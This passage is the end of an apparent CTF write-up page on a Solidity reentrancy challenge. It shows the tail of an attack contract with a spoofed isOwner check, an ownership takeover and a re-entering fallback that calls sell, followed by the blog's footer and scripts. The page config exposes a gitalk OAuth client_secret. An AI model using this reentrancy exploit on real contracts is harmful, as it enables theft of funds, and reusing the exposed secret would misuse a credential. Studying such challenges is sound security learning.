class="line"></span><br><span class="line">    function isOwner(address) view public returns (bool)&#123;</span><br><span class="line">        flag=!flag;</span><br><span class="line">        return flag;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack()&#123;</span><br><span class="line">        om.sell(200);</span><br><span class="line">        om.change(address(this));</span><br><span class="line">        om.change_Owner();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function payforflag(string b64email)&#123;</span><br><span class="line">        om.payforflag(b64email);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function()public payable&#123;</span><br><span class="line">        if(!status)&#123;</span><br><span class="line">            status=!status;</span><br><span class="line">            om.sell(200);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/blockchain/" rel="tag"><i class="fa fa-tag"></i> blockchain</a>
+              <a href="/tags/reentrancy/" rel="tag"><i class="fa fa-tag"></i> reentrancy</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2022/06/27/%E5%8C%BA%E5%9D%97%E9%93%BEstorage%E5%AD%98%E5%82%A8%E5%86%99%E6%BC%8F%E6%B4%9E%E7%BB%83%E4%B9%A0/" rel="prev" title="区块链storage存储写漏洞练习">
+                  <i class="fa fa-chevron-left"></i> 区块链storage存储写漏洞练习
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+    <div class="comments gitalk-container"></div>
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Lorlike</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+  
+
+
+
+
+  
+
+  <script class="next-config" data-name="enableMath" type="application/json">true</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"none","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.0/es5/tex-mml-chtml.js","integrity":"sha256-r+3itOMtGGjap0x+10hu6jW/gZCzxHsoKrOd7gyRSGY="}}</script>
+<script src="/js/third-party/math/mathjax.js"></script>
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/gitalk/1.7.2/gitalk.css" integrity="sha256-AJnUHL7dBv6PGaeyPQJcgQPDjt/Hn/PvYZde1iqfp8U=" crossorigin="anonymous">
+
+<script class="next-config" data-name="gitalk" type="application/json">{"enable":true,"github_id":"lorlike","repo":"lorlike.github.io","client_id":"6acca03e9c7b6c3d4edc","client_secret":"7e31b7e4d4e6b9dc0a539efcd935a2aa8f667d26","admin_user":"lorlike","distraction_free_mode":true,"proxy":"https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token","language":null,"js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/gitalk/1.7.2/gitalk.min.js","integrity":"sha256-Pmj85ojLaPOWwRtlMJwmezB/Qg8BzvJp5eTzvXaYAfA="},"path_md5":"5aab1ddf85636ed647c44921dee8e233"}</script>
+<script src="/js/third-party/comments/gitalk.js"></script>
+
+</body>
+</html>
